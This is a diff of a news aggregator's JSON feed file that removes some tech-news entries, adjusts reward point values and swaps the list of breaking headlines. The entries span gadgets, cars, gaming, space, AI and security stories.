-      "excerpt": "If you have an iPhone, that is.",
-      "body": "If you have an iPhone, that is.\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "staff@engadget.com (Will Shanklin)",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gadgets",
-      "tags": [
-        "Gadgets"
-      ],
-      "featured": false,
-      "xpReward": 54,
-      "url": "https://www.engadget.com/2294275/the-most-unexpected-everyday-tool-can-be-found-on-your-phone/",
-      "image": "/images/feed/feed-d058d313831a.jpg",
-      "source": "Engadget",
-      "isLive": true
-    },
-    {
-      "id": "feed-7c9a9e50080f",
-      "title": "Even the best mesh Wi-Fi system can be easily improved with a simple cable",
-      "excerpt": "Mesh systems generally provide better Wi-Fi coverage than standalone routers, but you can make the mesh signal even stronger.",
-      "body": "Mesh systems generally provide better Wi-Fi coverage than standalone routers, but you can make the mesh signal even stronger.\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "staff@engadget.com (Roger Fingas)",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gadgets",
-      "tags": [
-        "Gadgets"
-      ],
-      "featured": false,
-      "xpReward": 43,
-      "url": "https://www.engadget.com/2293493/mesh-wifi-system-improved-with-simple-cable/",
-      "image": "/images/feed/feed-7c9a9e50080f.jpg",
-      "source": "Engadget",
-      "isLive": true
-    },
-    {
       "id": "feed-020321ddfc52",
       "title": "New Li Auto i6 Goes 811 km (504 Miles)",
       "excerpt": "Li Auto’s new i6 electric vehicle has a very interesting look. It makes me think of something out of some futuristic movie or The Jetsons. It certainly has an MPV (multipurpose vehicle) design that is…",
@@ -299,7 +451,7 @@
         "Cars"
       ],
       "featured": false,
-      "xpReward": 51,
+      "xpReward": 53,
       "url": "https://cleantechnica.com/2026/10/25/new-li-auto-i6-goes-811-km-504-miles/",
       "image": "/images/feed/feed-020321ddfc52.jpg",
       "source": "CleanTechnica",
@@ -318,29 +470,10 @@
         "Cybersecurity"
       ],
       "featured": false,
-      "xpReward": 32,
+      "xpReward": 51,
       "url": "https://thehackernews.com/2026/10/unpatched-tailscale-ssh-flaws-could-let.html",
       "image": "/images/feed/feed-a015bc5461ff.jpg",
       "source": "The Hacker News",
-      "isLive": true
-    },
-    {
-      "id": "feed-13fa1bfa55f6",
-      "title": "Mass Effect Leaks Reveal Canceled BioWare Game's Story Would Have Accounted for 'All' Choices From Previous Games",
-      "excerpt": "Additional details about BioWare's canceled Mass Effect game have leaked online, revealing a story that would have taken choices from the Commander Shepard trilogy into account if EA hadn't shut down…",
-      "body": "Additional details about BioWare&#39;s canceled Mass Effect game have leaked online, revealing a story that would have taken choices from the Commander Shepard trilogy into account if EA hadn&#39;t shut down the studio. The long-awaited and currently canned follow-up for the sci-fi RPG franchise, which was working under the title Mass Effect: Universe, was built around decisions made in the original games, according to comments shared by former technical director Romain Toutain during a recent livestream (via Kotaku ). As more details about the project leak, there&#39;s no telling exactly how thorough this system would have been, but he did his best to give fans an idea.",
-      "author": "Michael Cripe",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gaming",
-      "tags": [
-        "Game"
-      ],
-      "featured": false,
-      "xpReward": 34,
-      "url": "https://www.ign.com/articles/mass-effect-leaks-reveal-canceled-bioware-games-story-would-have-accounted-for-all-choices-from-previous-games",
-      "image": "/images/feed/feed-13fa1bfa55f6.jpg",
-      "source": "IGN",
       "isLive": true
     },
     {
@@ -375,7 +508,7 @@
         "Exploit"
       ],
       "featured": false,
-      "xpReward": 35,
+      "xpReward": 34,
       "url": "https://thehackernews.com/2026/10/php2shell-exploitation-hits-government.html",
       "image": "/images/feed/feed-0f2325be7a10.jpg",
       "source": "The Hacker News",
@@ -394,7 +527,7 @@
         "Cars"
       ],
       "featured": false,
-      "xpReward": 48,
+      "xpReward": 39,
       "url": "https://cleantechnica.com/2026/10/25/trump-doe-budget-cuts-energy-research/",
       "image": "/images/feed/feed-46659f2b67dc.png",
       "source": "CleanTechnica",
@@ -413,48 +546,10 @@
         "Cars"
       ],
       "featured": false,
-      "xpReward": 39,
+      "xpReward": 49,
       "url": "https://cleantechnica.com/2026/10/25/elon-musk-the-movie-blackout-billionaires/",
       "image": "/images/feed/feed-eff0342d26cb.png",
       "source": "CleanTechnica",
-      "isLive": true
-    },
-    {
-      "id": "feed-1508f19f05a2",
-      "title": "'Avatar: Seven Havens' Fans Need to Watch Disney’s Overlooked Apocalyptic Fantasy Adventure",
-      "excerpt": "Raya and the Last Dragon has similar settings, characters, and dynamics as Avatar: Seven Havens, so it's a must-watch for fans.",
-      "body": "Raya and the Last Dragon has similar settings, characters, and dynamics as Avatar: Seven Havens, so it's a must-watch for fans.\n\nThis report, published by Polygon, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gaming. As the situation continues to evolve, professionals and enthusiasts in the gaming and interactive entertainment field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Polygon using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "Corey Plante",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gaming",
-      "tags": [
-        "Gaming"
-      ],
-      "featured": false,
-      "xpReward": 48,
-      "url": "https://www.polygon.com/raya-and-the-last-dragon-perfect-disney-movie-for-avatar-seven-havens-fans/",
-      "image": "/images/feed/feed-1508f19f05a2.jpg",
-      "source": "Polygon",
-      "isLive": true
-    },
-    {
-      "id": "feed-324fe27793de",
-      "title": "This Switch 2 sequel accessory was a few millimeters away from being good",
-      "excerpt": "The stick and face buttons are too close for comfort. | Photo: Cameron Faulkner / The Verge The Crkd Nitro Deck was a saving grace for the original Nintendo Switch. The slide-on $59.99 accessory broug…",
-      "body": "The stick and face buttons are too close for comfort. | Photo: Cameron Faulkner / The Verge The Crkd Nitro Deck was a saving grace for the original Nintendo Switch. The slide-on $59.99 accessory brought Hall effect sticks to drift-plagued consoles - no need to open up your Joy-Con for a complicated repair. The Nitro Deck 2, made for both the original Switch and the larger Switch 2, continues the tradition of having better sticks than what Nintendo puts in even the newest Joy-Con (though these aren't Hall effect or TMR). But it doesn't feel as essential, and there's one thing I really can't stand about it. It's too difficult to use the Nitro Deck 2's ABXY face buttons without the right stick getting in the way. The stick-to-button … Read the full story at The Verge.",
-      "author": "Cameron Faulkner",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gaming",
-      "tags": [
-        "Gaming"
-      ],
-      "featured": false,
-      "xpReward": 36,
-      "url": "https://www.theverge.com/tech/1017508/crkd-nitro-deck-2-nintendo-switch-2-controller-case-hands-on",
-      "image": "/images/feed/feed-324fe27793de.jpg",
-      "source": "The Verge",
       "isLive": true
     },
     {
@@ -470,86 +565,10 @@
         "Ai"
       ],
       "featured": false,
-      "xpReward": 44,
+      "xpReward": 31,
       "url": "https://techcrunch.com/2026/10/25/ai-delivers-zero-financial-payoff-to-most-companies-according-to-apollo-economist/",
       "image": "/images/feed/feed-71c43854f4ff.webp",
       "source": "TechCrunch",
-      "isLive": true
-    },
-    {
-      "id": "feed-1f9b9c1a576f",
-      "title": "What features do you lose if you use Apple AirPods with a Samsung Galaxy phone?",
-      "excerpt": "AirPods work with any Bluetooth device, but they lose almost all of Apple's fancy features.",
-      "body": "AirPods work with any Bluetooth device, but they lose almost all of Apple's fancy features.\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "staff@engadget.com (Luke James)",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gadgets",
-      "tags": [
-        "Gadgets"
-      ],
-      "featured": false,
-      "xpReward": 33,
-      "url": "https://www.engadget.com/2293387/features-lost-use-apple-airpods-with-samsung-galaxy-phone/",
-      "image": "/images/feed/feed-1f9b9c1a576f.jpg",
-      "source": "Engadget",
-      "isLive": true
-    },
-    {
-      "id": "feed-6ac17aea0d11",
-      "title": "8BitDo's latest button-only arcade controller is now up for pre-order",
-      "excerpt": "The Arcade Controller Pro starts at $119.99 and will start shipping in late November.",
-      "body": "The Arcade Controller Pro starts at $119.99 and will start shipping in late November.\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "staff@engadget.com (Jackson Chen)",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gadgets",
-      "tags": [
-        "Gadgets"
-      ],
-      "featured": false,
-      "xpReward": 48,
-      "url": "https://www.engadget.com/2296362/8bitdos-latest-button-only-arcade-controller-is-now-up-for-preorder/",
-      "image": "/images/feed/feed-6ac17aea0d11.jpg",
-      "source": "Engadget",
-      "isLive": true
-    },
-    {
-      "id": "feed-451013bd4fb2",
-      "title": "The internet needs IPv6 and so does your home network",
-      "excerpt": "IPv6 has more available addresses than we could ever hope to use, but not all devices are taking advantage yet.",
-      "body": "IPv6 has more available addresses than we could ever hope to use, but not all devices are taking advantage yet.\n\nThis report, published by Engadget, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to Engadget using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "staff@engadget.com (Luke James)",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gadgets",
-      "tags": [
-        "Gadgets"
-      ],
-      "featured": false,
-      "xpReward": 31,
-      "url": "https://www.engadget.com/2293285/internet-home-network-needs-ipv6/",
-      "image": "/images/feed/feed-451013bd4fb2.jpg",
-      "source": "Engadget",
-      "isLive": true
-    },
-    {
-      "id": "feed-85f3555f8e5b",
-      "title": "OLED iPad mini 8 debuting this week: Here’s what’s coming, and how much it’ll cost",
-      "excerpt": "For the first time since 2021, Apple will be overhauling the iPad mini with new display technology. It also marks the first chip refresh since 2024. Here’s what Apple has in store for this all-new iPa…",
-      "body": "For the first time since 2021, Apple will be overhauling the iPad mini with new display technology. It also marks the first chip refresh since 2024. Here’s what Apple has in store for this all-new iPa — a development drawing significant attention in the consumer technology and devices space.\n\nThis report, published by 9to5Mac, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Gadgets. As the situation continues to evolve, professionals and enthusiasts in the consumer technology and devices field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to 9to5Mac using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "Michael Burkhardt",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "gadgets",
-      "tags": [
-        "Gadgets"
-      ],
-      "featured": false,
-      "xpReward": 31,
-      "url": "https://9to5mac.com/2026/10/25/ipad-mini-8-redesign-with-oled-coming-this-week/",
-      "image": "/images/feed/feed-85f3555f8e5b.jpg",
-      "source": "9to5Mac",
       "isLive": true
     },
     {
@@ -565,7 +584,7 @@
         "Cybersecurity"
       ],
       "featured": false,
-      "xpReward": 45,
+      "xpReward": 47,
       "url": "https://www.bleepingcomputer.com/news/security/ai-coding-agents-hijacked-using-agentsmd-file-in-downloads-folder/",
       "image": "/images/feed/feed-3a31401ab192.jpg",
       "source": "BleepingComputer",
@@ -584,7 +603,7 @@
         "Cars"
       ],
       "featured": false,
-      "xpReward": 40,
+      "xpReward": 53,
       "url": "https://insideevs.com/news/813122/chery-us-try-soon-launch/",
       "image": "/images/feed/feed-e3f44149150b.jpg",
       "source": "InsideEVs",
@@ -603,29 +622,10 @@
         "Space"
       ],
       "featured": false,
-      "xpReward": 52,
+      "xpReward": 36,
       "url": "https://www.space.com/space-exploration/on-this-day-in-space-oct-25-1671-astronomer-giovanni-cassini-discovers-iapetus-saturns-yin-yang-moon",
       "image": "/images/feed/feed-7a65f0c37510.jpg",
       "source": "Space.com",
-      "isLive": true
-    },
-    {
-      "id": "feed-918d0b4bb05f",
-      "title": "The Entegra Coach Embark Is An Electric RV Without The Range Anxiety",
-      "excerpt": "The $400,000 mobile home brings electrification to the RV space in a whole new way.",
-      "body": "The $400,000 mobile home brings electrification to the RV space in a whole new way.\n\nThis report, published by InsideEVs, touches on a topic that has been gaining momentum across the industry. Key areas highlighted include Cars. As the situation continues to evolve, professionals and enthusiasts in the electric vehicles, hybrids, and automotive technology field are closely watching for downstream effects.\n\nFor the full breakdown, analysis, and expert commentary, head to InsideEVs using the link below. GiveMeTech will continue tracking this story as more details emerge.",
-      "author": "InsideEVs",
-      "date": "2026-10-25",
-      "readTime": "2 min",
-      "section": "cars",
-      "tags": [
-        "Cars"
-      ],
-      "featured": false,
-      "xpReward": 38,
-      "url": "https://insideevs.com/features/813127/entegra-coach-electric-rv-range-extender/",
-      "image": "/images/feed/feed-918d0b4bb05f.jpg",
-      "source": "InsideEVs",
       "isLive": true
     },
     {
@@ -641,7 +641,7 @@
         "Space"
       ],
       "featured": false,
-      "xpReward": 35,
+      "xpReward": 47,
       "url": "https://www.space.com/stargazing/octobers-hunters-moon-stalks-into-the-autumn-sky-tonight-heres-what-you-need-to-know",
       "image": "/images/feed/feed-e9ae28634ee8.jpg",
       "source": "Space.com",
@@ -660,7 +660,7 @@
         "Ai"
       ],
       "featured": false,
-      "xpReward": 45,
+      "xpReward": 48,
       "url": "https://cleantechnica.com/2026/10/25/invest-in-solar-and-earn-3000-a-day/",
       "image": "/images/feed/feed-a1af51ec2984.jpg",
       "source": "CleanTechnica",
@@ -679,7 +679,7 @@
         "Space"
       ],
       "featured": false,
-      "xpReward": 49,
+      "xpReward": 33,
       "url": "https://science.nasa.gov/image-article/apod-2026-october-25-dark-matter-in-a-simulated-universe/",
       "image": "/images/feed/feed-2a5d77bec5cc.jpg",
       "source": "NASA Breaking News",
@@ -698,7 +698,7 @@
         "Cybersecurity"
       ],
       "featured": false,
-      "xpReward": 31,
+      "xpReward": 54,
       "url": "https://thehackernews.com/2026/10/openai-ai-agents-demonstrate-vm-escapes.html",
       "image": "/images/feed/feed-059df2aa94c4.jpg",
       "source": "The Hacker News",
@@ -717,7 +717,7 @@
         "Space"
       ],
       "featured": false,
-      "xpReward": 42,
+      "xpReward": 33,
       "url": "https://techcrunch.com/2026/10/24/starlink-seems-to-be-working-normally-again-in-ukraine/",
       "image": "/images/feed/feed-aae262bb6858.jpg",
       "source": "TechCrunch",
@@ -736,7 +736,7 @@
         "Ai"
       ],
       "featured": false,
-      "xpReward": 46,
+      "xpReward": 33,
       "url": "https://techcrunch.com/2026/10/24/the-ai-graveyard-a-running-list-of-projects-and-startups-that-didnt-make-it/",
       "image": "/images/feed/feed-41208e707565.webp",
       "source": "TechCrunch",
@@ -775,7 +775,7 @@
         "Space"
       ],
       "featured": false,
-      "xpReward": 47,
+      "xpReward": 44,
       "url": "https://www.space.com/entertainment/space-movies-shows/this-week-in-space-podcast-episode-233-the-artemis-generation",
       "image": "/images/feed/feed-585b1c3a2506.jpg",
       "source": "Space.com",
@@ -813,9 +813,9 @@
         "Openai"
       ],
       "featured": false,
-      "xpReward": 48,
+      "xpReward": 32,
       "url": "https://techcrunch.com/2026/10/24/forced-to-pick-groks-ai-model-chooses-republicans-openais-picks-democrats/",
-      "image": "/images/feed/feed-b8554dad591a.jpg",
+      "image": "/images/feed/feed-b8554dad591a.webp",
       "source": "TechCrunch",
       "isLive": true
     },
@@ -832,7 +832,7 @@
         "Exploit"
       ],
       "featured": false,
-      "xpReward": 36,
+      "xpReward": 44,
       "url": "https://www.bleepingcomputer.com/news/security/blackx-uefi-bootkit-exploits-baton-drop-flaw-to-bypass-secure-boot/",
       "image": "/images/feed/feed-e7f9610cf94e.jpg",
       "source": "BleepingComputer",
@@ -851,7 +851,7 @@
         "Space"
       ],
       "featured": false,
-      "xpReward": 38,
+      "xpReward": 40,
       "url": "https://www.space.com/entertainment/space-movies-shows/star-trek-strange-new-worlds-season-of-gimmicks-was-afraid-to-say-anything",
       "image": "/images/feed/feed-2abf36f217ca.jpg",
       "source": "Space.com",
@@ -870,7 +870,7 @@
         "Exploit"
       ],
       "featured": false,
-      "xpReward": 46,
+      "xpReward": 52,
       "url": "https://www.wired.com/story/kernel-panic-the-php-meltdown-shows-how-ai-makes-bugs-more-exploitable/",
       "image": "/images/feed/feed-156181babac7.jpg",
       "source": "Wired",
@@ -889,7 +889,7 @@
         "Cybersecurity"
       ],
       "featured": false,
-      "xpReward": 36,
+      "xpReward": 53,
       "url": "https://thehackernews.com/2026/10/brotli-decoder-flaw-behind-nodejs-rce.html",
       "image": "/images/feed/feed-0f71ebe7a492.jpg",
       "source": "The Hacker News",
@@ -908,7 +908,7 @@
         "Ai"
       ],
       "featured": false,
-      "xpReward": 38,
+      "xpReward": 46,
       "url": "https://thehackernews.com/2026/10/google-says-gmail-and-photos-data.html",
       "image": "/images/feed/feed-c874b23267c2.jpg",
       "source": "The Hacker News",
@@ -927,7 +927,7 @@
         "Ai"
       ],
       "featured": false,
-      "xpReward": 32,
+      "xpReward": 49,
       "url": "https://cleantechnica.com/2026/10/23/us-tech-leaders-are-urgently-calling-for-rules-on-ai-china-already-has-them/",
       "image": "/images/feed/feed-e138519c2f71.png",
       "source": "CleanTechnica",
@@ -935,16 +935,16 @@
     }
   ],
   "breakingNews": [
-    "DEV.TO: A Retry-Safe Handoff Contract for Long AI Chats",
-    "DEV.TO: How to sell printables and digital downloads outside Etsy (what you keep on an $8 and $27 sale)",
-    "DEV.TO: [Boost]",
-    "KOTAKU: 13 Short And Sweet Scary Games To Treat Yourself To Before Halloween",
-    "DEV.TO: I built a free Merge PDF tool with no sign-up and no watermark",
-    "DEV.TO: You can't quiz someone into writing tests",
-    "DEV.TO: Anthropic Sandbox Runtime: OS-Level Agent Sandboxing Without Containers",
-    "DEV.TO: Evidence-Aware RAG Evaluation: Why Ground Truth Coverage Determines Retrieval Scores in Clinical Agent Systems",
-    "POLYGON: 15 Years Later, Batman: Arkham City Remains Batman's Last Gaming Masterpiece",
-    "POLYGON: 6 Hilarious 'Calvin and Hobbes' Comics Where Calvin is a Weird Little Genius"
+    "DEV.TO: Why an LLM Price Table Needs Provenance, Not Just Numbers",
+    "DEV.TO: Digital Nomad Banking & Finance 2026: Managing Money Across Borders Without Getting Screwed on Fees",
+    "DEV.TO: Hey Mirae, continue our story",
+    "DEV.TO: Why autoscaling a MongoDB replica set by CPU alone breaks consistency — and what we tried instead",
+    "ENGADGET: Does TSA actually allow AirTags in your luggage? Here's what the rules say",
+    "DEV.TO: Sobrevivendo ao Caos: Injetando Falhas Estratégicas com o ChaosEngineeringMasterDeck",
+    "DEV.TO: Six minor releases of exposure: what the NSD 4.10.0 to 4.15.2 range says about patch cadence",
+    "DEV.TO: MVP — Minimum Viable Person: a survival tracker that knows how long you'll survive",
+    "ENGADGET: Don't throw away your old, unsupported Nest gadgets — Do this instead",
+    "CLEANTECHNICA: Volkswagen Negotiations With IG Metall To Begin November 24, Audi Factory In US Rumored"
   ],
   "sectionVideos": {}
 }
